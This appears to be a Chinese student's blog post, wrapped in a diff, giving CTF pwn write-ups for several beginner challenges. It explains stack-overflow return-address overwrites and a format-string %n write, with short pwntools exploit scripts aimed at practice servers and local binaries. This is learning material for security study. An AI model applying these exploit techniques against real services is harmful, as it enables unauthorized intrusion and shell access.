@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+  <head>
+     
+    <meta charset="UTF-8">
+    <title>集训1-2周wp - Hexo</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
+
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, maximum-scale=1, initial-scale=1"/>
+    <meta property="og:site_name" content="Hexo">
+    <meta property="og:title" content="集训1-2周wp"/>
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>Hexo</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a>分类</a>
+            <div class="sub-menu">
+                
+            </div>
+        </div>
+        
+            <a href="/about">关于我</a>
+        
+            <a href="/friends">朋友们</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="post-title">
+            <h2>集训1-2周wp</h2>
+            <div class="post-meta">
+                <time class="date">2024.03.05</time>
+            
+            </div>
+        </section>
+        <article class="post-content">
+        
+            <p>以下列形式提出问题：</p>
+<ul>
+<li>Q：巴拉巴拉</li>
+</ul>
+<p>求大佬解答</p>
+<h1 id="第一题：test-your-nc"><a href="#第一题：test-your-nc" class="headerlink" title="第一题：test_your_nc"></a>第一题：test_your_nc</h1><p>看名字就知道是nc指令，nc一下它给的网址，再ls发现有flag，直接cat flag即可拿到flag。</p>
+<p><img src="https://img.picgo.net/2023/10/19/29514751-7e54-4a70-8f01-064c5cec194816c7708458a13134.png" alt="29514751-7e54-4a70-8f01-064c5cec194816c7708458a13134.png"></p>
+<h1 id="第二题：jarvisoj-level0"><a href="#第二题：jarvisoj-level0" class="headerlink" title="第二题：jarvisoj_level0"></a>第二题：jarvisoj_level0</h1><p><img src="https://img.picgo.net/2023/10/19/c4ffa1ff-8a7f-4ec1-9e97-659537fd2e3f913133ba397fae85.png" alt="c4ffa1ff-8a7f-4ec1-9e97-659537fd2e3f913133ba397fae85.png"><br>一看源代码，第一行write没啥信息，第二行调用一个函数，跟进一下</p>
+<p><img src="https://img.picgo.net/2023/10/19/9ba64601-b916-4b05-9791-5d392898c72bedc5ce663e5c9d16.png" alt="9ba64601-b916-4b05-9791-5d392898c72bedc5ce663e5c9d16.png"></p>
+<p><img src="https://img.picgo.net/2023/10/19/10e71318-5d6c-4ada-8838-e2f1d9862c19c2765601cb44037e.png" alt="10e71318-5d6c-4ada-8838-e2f1d9862c19c2765601cb44037e.png"></p>
+<p>一看，buf开了128字节空间，然后read读了0x200字节，很显然栈溢出，需要往buf里填0x88个垃圾信息，才能覆盖到返回地址，去找能get shell的函数。<br><img src="https://img.picgo.net/2023/10/19/56bdaf9b-89ca-40f5-8fb7-5f4726bf97da009fc3c81c17cc24.png" alt="56bdaf9b-89ca-40f5-8fb7-5f4726bf97da009fc3c81c17cc24.png"></p>
+<p><img src="https://img.picgo.net/2023/10/19/8eceb22a-6a47-4f01-bced-719ba552e8950b0d846911fe1cc7.png" alt="8eceb22a-6a47-4f01-bced-719ba552e8950b0d846911fe1cc7.png"></p>
+<p><img src="https://img.picgo.net/2023/10/19/8933266c-a760-4296-bb90-9976fe71bf025ed5909e56878c20.png" alt="8933266c-a760-4296-bb90-9976fe71bf025ed5909e56878c20.png"></p>
+<p>找到了callsystem()函数，能执行system(“&#x2F;bin&#x2F;sh”)来get shell，地址是400596，接下来构造payload。<br><img src="https://img.picgo.net/2023/10/19/b0009f47-8984-40c6-93c6-d5a9faff5806af0b2705791399ac.png" alt="b0009f47-8984-40c6-93c6-d5a9faff5806af0b2705791399ac.png"><br>ok，运行进入sh，ls一看有flag，cat flag即可拿到flag。<br><img src="https://img.picgo.net/2023/10/19/80fba2c5-8698-428e-9954-8350e137274dadfd2b61804b48c4.png" alt="80fba2c5-8698-428e-9954-8350e137274dadfd2b61804b48c4.png"></p>
+<h1 id="第三题：gift军训版"><a href="#第三题：gift军训版" class="headerlink" title="第三题：gift军训版"></a>第三题：gift军训版</h1><p>讲过，做过，略写。<br>ida逆向发现要输入一个ascll值为-127的字符,pwntools输入0x81,然后cat flag。</p>
+<h1 id="第四题：pwn1-sctf-2016"><a href="#第四题：pwn1-sctf-2016" class="headerlink" title="第四题：pwn1_sctf_2016"></a>第四题：pwn1_sctf_2016</h1><h3 id="0x00-前置条件"><a href="#0x00-前置条件" class="headerlink" title="0x00 前置条件"></a>0x00 前置条件</h3><p>动态调试,先装好pwndbg等工具</p>
+<h3 id="0x01-开始做题"><a href="#0x01-开始做题" class="headerlink" title="0x01 开始做题"></a>0x01 开始做题</h3><h4 id="第一步-首先file看一下文件"><a href="#第一步-首先file看一下文件" class="headerlink" title="第一步:首先file看一下文件"></a>第一步:首先file看一下文件</h4><p><img src="https://img.picgo.net/2023/10/19/97c72b3d-1cc9-412f-bf31-5dff204a6970789a91da0ea11f8f.png" alt="97c72b3d-1cc9-412f-bf31-5dff204a6970789a91da0ea11f8f.png"><br>发现是32位elf Linux可执行文件</p>
+<h4 id="第二步-32位ida打开"><a href="#第二步-32位ida打开" class="headerlink" title="第二步:32位ida打开"></a>第二步:32位ida打开</h4><p><img src="https://img.picgo.net/2023/10/19/14587c1b-4021-41e9-a16b-88a613b1d1eb488a012785a134ab.png" alt="14587c1b-4021-41e9-a16b-88a613b1d1eb488a012785a134ab.png"><br>main函数没啥信息,只运行一个vuln()函数,跟进<br><img src="https://img.picgo.net/2023/10/19/a9ca2a7c-0588-47ba-bbe6-2ac5fd0e5b3789b269f6131ad3c5.png" alt="a9ca2a7c-0588-47ba-bbe6-2ac5fd0e5b3789b269f6131ad3c5.png"><br>一看代码,fgets函数,取了32字节信息到s,看看s开的空间<br><img src="https://img.picgo.net/2023/10/19/7881b540-5a61-4035-9f39-dd5ddd98e32e212c135f820e1af9.png" alt="7881b540-5a61-4035-9f39-dd5ddd98e32e212c135f820e1af9.png"><br>0x40个字节,看来是不能直接栈溢出了,但是观察到有you和I两个字符串,再看看别的函数.<br><img src="https://img.picgo.net/2023/10/19/f8f113e3-1135-48e8-babe-5b9231b07d6ea25a531a8be835ef.png" alt="f8f113e3-1135-48e8-babe-5b9231b07d6ea25a531a8be835ef.png"></p>
+<p><img src="https://img.picgo.net/2023/10/19/e3324f0f-87df-4f6d-a5e8-d223caeb19ea5cb72c66c7a46dff.png" alt="e3324f0f-87df-4f6d-a5e8-d223caeb19ea5cb72c66c7a46dff.png"></p>
+<p>看到一个很显眼的给flag的函数,记住地址0x8048f0d,根据提示进入动态调试环节.</p>
+<h4 id="第三步-动态调试"><a href="#第三步-动态调试" class="headerlink" title="第三步,动态调试."></a>第三步,动态调试.</h4><p>gdb打开并给main打断点</p>
+<p><img src="https://img.picgo.net/2023/10/19/32d6bc51-4011-44db-8709-347a4d3c9fa04fd17bf295fad966.png" alt="32d6bc51-4011-44db-8709-347a4d3c9fa04fd17bf295fad966.png"></p>
+<p>一步一步运行,发现要输入,输入I试试</p>
+<p><img src="https://img.picgo.net/2023/10/19/5dfc5990-6cdc-4d83-b879-083be5a11e14067d7bad44079b8a.png" alt="5dfc5990-6cdc-4d83-b879-083be5a11e14067d7bad44079b8a.png"></p>
+<p>程序把I替换成了you,那就可以栈溢出了,接下来写exp,注意到I变成you,1字节变成3字节,我们需要0x40即64个字节,所以写21个I,再附加1字节垃圾就可以凑满64字节,然后在后面加入get_flag函数的地址</p>
+<p><img src="https://img.picgo.net/2023/10/19/c9719727-6846-4d23-bd8c-f1d865235ff98ad17bee6eabc3ac.png" alt="c9719727-6846-4d23-bd8c-f1d865235ff98ad17bee6eabc3ac.png"></p>
+<p>运行即可拿到flag</p>
+<p><img src="https://img.picgo.net/2023/10/19/8d82a6de-09ab-4126-a342-0a184fe438bbfb2e8f5b3b4ee3a2.png" alt="8d82a6de-09ab-4126-a342-0a184fe438bbfb2e8f5b3b4ee3a2.png"></p>
+<h1 id="第五题：-第五空间2019-决赛-PWN5"><a href="#第五题：-第五空间2019-决赛-PWN5" class="headerlink" title="第五题：[第五空间2019 决赛]PWN5"></a>第五题：[第五空间2019 决赛]PWN5</h1><p>通过格式化字符串漏洞，可以实现任意内存写，此题就是利用此漏洞。</p>
+<p><img src="https://img.picgo.net/2023/10/20/Snipaste_2023-10-20_17-22-29aebd120ab51da263.png" alt="Snipaste_2023-10-20_17-22-29aebd120ab51da263.png"></p>
+<p>先分析本题，程序读了一个随机数到0x804c44这个地址，而要我们的输入的uptr等于这个随机就可以get shell，所以只要通过这个格式化字符串漏洞将这个随机数改成我们想要的数即可。分析完毕！开始解题。</p>
+<p>首先算内存偏移。</p>
+<p>先运行一下源代码，输入%p可以输出内存地址。所以输入：</p>
+<blockquote>
+<p>AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p </p>
+</blockquote>
+<p><img src="https://img.picgo.net/2023/10/20/LX4J6KXW995K_NS6LPC7b77e532544a8732.png" alt="LX4J6KXW995K_NS6LPC7b77e532544a8732.png"></p>
+<p>可以看到输出了:</p>
+<blockquote>
+<p>AAAA 0xffffd318 0x63 (nil) (nil) 0x3 0xf7ffdc08 0xffffd380 0xf7ffcff4 0xc 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025</p>
+</blockquote>
+<p>因为A的ascll码是0x41，数一下从AAAA到0x41414141，一共是多少个内存地址：10个。所以内存偏移是10.</p>
+<ul>
+<li>Q：内存偏移是什么意思，为啥要叫内存偏移？</li>
+</ul>
+<p>然后利用格式化漏洞中的%n可以将已经打印出的字符串数写入某个地址。</p>
+<p>例如本题：</p>
+<p>输入：AAAA %p，会得到输出：AAAA 0xffffd318。</p>
+<p>那么如果改为输入：AAAA %n，就会将已经打印出的字符串数（这里是4个A也就是4）写入0xffffd318这个地址中去。</p>
+<p>%n还有一种用法：%k$n（k为一个正整数），就会将已经打印出的字符串数写入第k个参数中。</p>
+<p>还是以上文为例，如果改为输入：AAAA %1$n，会写入0xffffd318这个地址中去。</p>
+<p>如果改为输入：AAAA %2$n，会写入0x63这个地址中去（但是这里0x63是数据，不是地址，所以会覆盖0x63，变成0x4）。后面以此类推。</p>
+<p>首先根据前文已知AAAA是储存在第10个参数的位置的，所以我们把AAAA改为这个随机数的地址0x804c44，然后跟%10$n就可以将已经打印出的字符串数（这里是4）写入0x804c44这个地址中去，将随机数写成4。</p>
+<p>然后password输入4就可以get shell了。下面写exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;26731&#x27;</span>)</span><br><span class="line">payload = p32(<span class="number">0x804c044</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%10$n&#x27;</span></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">conn.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行即可。</p>
+<p>（以上是个人理解，刚开始学汇编可能术语会说错很多，思路是这样）</p>
+<h1 id="第六题：get-started-3dsctf-2016"><a href="#第六题：get-started-3dsctf-2016" class="headerlink" title="第六题：get_started_3dsctf_2016"></a>第六题：get_started_3dsctf_2016</h1><p><img src="https://img.picgo.net/2023/10/20/Snipaste_2023-10-20_17-37-442eb3f4235c8dcda7.png" alt="Snipaste_2023-10-20_17-37-442eb3f4235c8dcda7.png"></p>
+<p>可以看到main函数里有个非常明显的gets函数可以栈溢出，又可以发现一个非常明显的后门函数get_flag。</p>
+<p><img src="https://img.picgo.net/2023/10/20/Snipaste_2023-10-20_17-39-53ed60a9eae696aff1.png" alt="Snipaste_2023-10-20_17-39-53ed60a9eae696aff1.png"></p>
+<p>而这个函数里有个if判断，需要满足才能获得flag，并且要程序正常退出才能看到回显。</p>
+<ul>
+<li>Q：怎么看是否需要正常退出才能有回显？</li>
+</ul>
+<p>gdb调试，使用disass指令找到get_flag函数的汇编指令，看它是怎么运行的。</p>
+<p><img src="https://img.picgo.net/2023/10/20/Snipaste_2023-10-20_17-43-42a24d69051e2de1b4.png" alt="Snipaste_2023-10-20_17-43-42a24d69051e2de1b4.png"></p>
+<p>可以看到这个函数长这样，先写exp跳到这个函数上来。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#ip = &quot;node4.buuoj.cn:27062&quot;</span></span><br><span class="line"><span class="comment">#ip = ip.split(&quot;:&quot;)</span></span><br><span class="line"><span class="comment">#c = remote(ip[0],ip[1])</span></span><br><span class="line">c = process(<span class="string">&quot;/CTF/week12/source/6get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">gdb.attach(c)</span><br><span class="line">getflag = p32(<span class="number">0x080489A0</span>)</span><br><span class="line">exit = p32(<span class="number">0x804E6A0</span>)</span><br><span class="line">a1 = p32(<span class="number">814536271</span>)</span><br><span class="line">a2 = p32(<span class="number">425138641</span>)</span><br><span class="line"><span class="comment">#p = b&quot;a&quot;*56+getflag+exit+a1+a2</span></span><br><span class="line">p = <span class="string">b&quot;a&quot;</span>*<span class="number">56</span>+getflag</span><br><span class="line">c.sendline(p)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c = process(<span class="string">&quot;/CTF/week12/source/6get_started_3dsctf_2016&quot;</span>)</span><br><span class="line">gdb.attach(c)</span><br></pre></td></tr></table></figure>
+
+<p>其中这两句的作用是本地开一个进程并进行调试。</p>
+<p>运行此脚本自动进入gdb，然后按c、回车，让程序继续。（记得在脚本目录下建一个flag.txt，否则会报错）</p>
+<p><img src="https://img.picgo.net/2023/10/20/Snipaste_2023-10-20_18-57-00b469dc657c33b33a.png" alt="Snipaste_2023-10-20_18-57-00b469dc657c33b33a.png"></p>
+<p>记住当前的栈，运行到最后的ret。</p>
+<p><img src="https://img.picgo.net/2023/10/20/Snipaste_2023-10-20_18-58-15fd853eb6f24d392b.png" alt="Snipaste_2023-10-20_18-58-15fd853eb6f24d392b.png"></p>
+<p>可以看到最后一个ret会返回到0xffb74450地址上的地址。</p>
+<p><img src="https://img.picgo.net/2023/10/20/Snipaste_2023-10-20_19-38-424c4f7249ce83a659.png" alt="Snipaste_2023-10-20_19-38-424c4f7249ce83a659.png"></p>
+<p>（不是同一次调试，地址有所改变）这里可以看到一开始esp指向0xfff76f8c，运行两行之后指向0xfff76f84，而这里就是构造的payload里的‘a’，而现在指的语句要进行if的第一个判断，即a1 &#x3D;&#x3D; 814536271</p>
+<p>根据现在指向的  cmp    dword ptr [esp + 0x10], 0x308cd64f  这句话可知，a1应该储存在esp+0x10的位置，且等于0x308cd64f（16进制的814536271）才能成立，同理，a2储存在a1的后4字节中。即a1应储存在0xfff76f94，而a2应储存在0xfff76f98，且，函数会返回到0xfff76f90上的地址。</p>
+<p>综上，我们就可以构造payload了：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">b&quot;a&quot;</span>*<span class="number">56</span>+getflag+exit+a1+a2</span><br></pre></td></tr></table></figure>
+
+<p>如上，b”a”*56是为了填满空间。</p>
+<p>getflag是get_flag函数地址覆盖返回地址，使gets跳到get_flag函数上。</p>
+<p>exit是使程序正常退出的函数，覆盖了get_flag函数的返回地址，使get_flag函数结束后能正常退出。</p>
+<p>a1，a2覆盖了if比较位置的数据的地址，使if判断成立。</p>
+<p>然后运行脚本即可拿到flag。</p>
+
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: <a href="/2024/03/05/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83/">石头剪刀布wp</a></li>
+                
+                
+                    <li>下一篇: <a href="/2024/03/05/%E9%9B%86%E8%AE%AD5-6%E5%91%A8wp/">集训5-6周wp</a></li>
+                
+            </ul>
+        </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://avatars.githubusercontent.com/u/149282793?v=4" alt="Skynion" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>Skynion</h4>
+                <p>学习Pwn ing</p>
+            </div>
+        </section>
+    
+    </div>
+</main>
+
+    <footer>
+    <div class="buttons">
+        <a class="to-top" href="#"></a>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E5%AF%92%E5%81%87%E7%AC%AC1%E5%91%A8wp/">寒假第1周wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E9%9B%86%E8%AE%AD3-4%E5%91%A8wp/">集训3-4周wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83/">石头剪刀布wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E9%9B%86%E8%AE%AD1-2%E5%91%A8wp/">集训1-2周wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/03/05/%E9%9B%86%E8%AE%AD5-6%E5%91%A8wp/">集训5-6周wp</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-date">时光机：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签云：</h3>
+                    
+                </div>
+            </div>
+        </section>
+        <section class="sub-footer">
+            <p>© 2024 <a href="/">Hexo</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
+    </div>
+</footer>
+
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":true,"night":true});</script>
+
+  </body>
+</html>
